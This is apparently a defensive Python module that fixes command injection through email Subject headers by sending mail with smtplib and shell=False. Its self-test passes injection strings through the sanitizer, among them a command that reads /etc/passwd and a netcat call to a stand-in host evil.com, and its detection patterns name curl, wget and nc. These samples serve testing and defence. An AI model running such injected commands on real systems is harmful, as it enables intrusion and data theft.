"""
smtp_header_injection_fix.py — Blind Command Injection via Email Header Fix

漏洞背景:
- 邮件发送功能将用户输入的Subject直接传给sendmail shell命令
- sendmail -s "{subject}" {email}
- 攻击者在Subject中注入;id > /tmp/out 执行任意命令
- 修复需要: 使用邮件库API而非shell命令 + 输入sanitize

本模块实现安全的邮件发送，禁用shell调用。
"""

import os
import re
import shlex
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, List, Optional, Tuple


class SMTPHeaderInjectionError(Exception):
    """SMTP头注入异常"""
    pass


class SecureEmailSender:
    """
    安全邮件发送器
    
    使用SMTP library API而非shell命令，
    防止命令注入攻击。
    """
    
    # 邮件头中禁止的字符
    FORBIDDEN_CHARS = frozenset({"\r", "\n", "\x00", "\x0a", "\x0d"})
    
    # 邮件头特殊字符
    HEADER_SPECIAL_CHARS = frozenset({";", "|", "&", "`", "$", "(", ")", "{", "}"})
    
    def __init__(self, smtp_host: str = "localhost", smtp_port: int = 25,
                 use_tls: bool = False, username: Optional[str] = None,
                 password: Optional[str] = None):
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.use_tls = use_tls
        self.username = username
        self.password = password
    
    @staticmethod
    def sanitize_header(value: str, header_name: str = "") -> str:
        """
        净化邮件头值
        
        移除或转义可能用于注入的字符。
        """
        if not value:
            return ""
        
        # 检查控制字符
        for char in SecureEmailSender.FORBIDDEN_CHARS:
            if char in value:
                raise SMTPHeaderInjectionError(
                    f"Control character {repr(char)} found in {header_name}"
                )
        
        # 移除或替换特殊字符
        sanitized = value
        for char in SecureEmailSender.HEADER_SPECIAL_CHARS:
            sanitized = sanitized.replace(char, "")
        
        # 限制长度防止缓冲区溢出
        max_length = 998  # RFC 5322 line length limit
        if len(sanitized) > max_length:
            sanitized = sanitized[:max_length]
        
        return sanitized
    
    @staticmethod
    def validate_email(email: str) -> bool:
        """验证邮箱格式"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email))
    
    def send_email_smtp(self, to_email: str, subject: str,
                        body: str, from_email: Optional[str] = None) -> bool:
        """
        使用SMTP library安全发送邮件
        
        使用Python的smtplib和email库，
        完全不使用shell命令。
        """
        import smtplib
        
        # 验证邮箱
        if not self.validate_email(to_email):
            raise SMTPHeaderInjectionError(f"Invalid email: {to_email}")
        
        # 净化邮件头
        safe_subject = self.sanitize_header(subject, "Subject")
        safe_from = self.sanitize_header(
            from_email or "noreply@example.com", "From"
        )
        
        # 使用email library构建消息
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = safe_subject
        msg["From"] = safe_from
        msg["To"] = to_email
        
        # 使用SMTP library发送
        try:
            with smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=30) as server:
                if self.use_tls:
                    server.starttls()
                if self.username and self.password:
                    server.login(self.username, self.password)
                server.sendmail(safe_from, [to_email], msg.as_string())
            return True
        except Exception as e:
            raise SMTPHeaderInjectionError(f"SMTP send failed: {e}") from e
    
    @staticmethod
    def send_email_safe(to_email: str, subject: str, body: str) -> bool:
        """
        安全的邮件发送函数（无shell调用）
        
        使用subprocess时禁用shell=True，
        使用参数列表传递。
        """
        # 验证输入
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', to_email):
            raise SMTPHeaderInjectionError("Invalid email format")
        
        safe_subject = SecureEmailSender.sanitize_header(subject, "Subject")
        safe_body = SecureEmailSender.sanitize_header(body, "Body")
        
        # 使用参数列表而非shell命令
        # 注意：不使用sendmail命令，使用SMTP library
        # 如果必须使用sendmail，使用参数列表并禁用shell
        try:
            cmd = ["/usr/sbin/sendmail", "-t"]
            proc = subprocess.run(
                cmd,
                input=f"To: {to_email}\nSubject: {safe_subject}\n\n{safe_body}\n",
                capture_output=True,
                text=True,
                timeout=30,
                shell=False,  # 禁用shell调用
            )
            if proc.returncode != 0:
                raise SMTPHeaderInjectionError(
                    f"sendmail failed: {proc.stderr}"
                )
            return True
        except subprocess.TimeoutExpired:
            raise SMTPHeaderInjectionError("sendmail timed out")
        except FileNotFoundError:
            # sendmail not available, use SMTP
            raise SMTPHeaderInjectionError("sendmail not available")
    
    @staticmethod
    def send_email_api(to_email: str, subject: str, body: str,
                       api_key: Optional[str] = None) -> bool:
        """
        使用邮件API发送（推荐方式）
        
        使用第三方邮件API完全避免shell调用。
        """
        # 输入净化
        safe_subject = SecureEmailSender.sanitize_header(subject, "Subject")
        
        # 构建邮件对象
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = safe_subject
        msg["From"] = "noreply@example.com"
        msg["To"] = to_email
        
        # 使用SMTP library发送
        return SecureEmailSender().send_email_smtp(to_email, subject, body)


def detect_command_injection_in_subject(subject: str) -> List[str]:
    """
    检测Subject中的命令注入尝试
    
    返回发现的注入模式列表。
    """
    findings = []
    
    injection_patterns = [
        (r";\s*(id|whoami|ls|cat|rm|wget|curl|nc|bash|sh|python)", "Command injection via ;"),
        (r"`[^`]+`", "Backtick command execution"),
        (r"\$\([^)]+\)", "Subshell command execution"),
        (r"\|", "Pipe command execution"),
        (r"&\s*(id|whoami|ls|cat)", "Background command execution"),
        (r">\s*(/tmp|/dev|/etc)", "Output redirection"),
        (r"\n", "Newline injection"),
        (r"\r\n", "CRLF injection"),
    ]
    
    for pattern, description in injection_patterns:
        if re.search(pattern, subject):
            findings.append(description)
    
    return findings


if __name__ == "__main__":
    # 测试安全邮件发送
    sender = SecureEmailSender()
    
    # 正常邮件
    try:
        result = sender.send_email_smtp(
            "user@example.com",
            "Test Subject",
            "Hello World"
        )
        print("Safe email: OK")
    except Exception as e:
        print(f"Safe email: {e}")
    
    # 注入测试
    malicious_subjects = [
        "test;id > /tmp/out",
        "test`whoami`",
        "test$(cat /etc/passwd)",
        "test|nc evil.com 4444",
    ]
    
    for subject in malicious_subjects:
        try:
            safe = SecureEmailSender.sanitize_header(subject, "Subject")
            print(f"Input '{subject[:20]}...' -> '{safe[:20]}...'")
        except SMTPHeaderInjectionError as e:
            print(f"BLOCKED: {e}")
    
    print("\nCommand Injection Prevention Features:")
    print("- SMTP library API (no shell commands)")
    print("- Input sanitization for all email headers")
    print("- Forbidden character detection (CR, LF, NULL)")
    print("- Email format validation")
    print("- subprocess with shell=False")
    print("- Length limit enforcement")
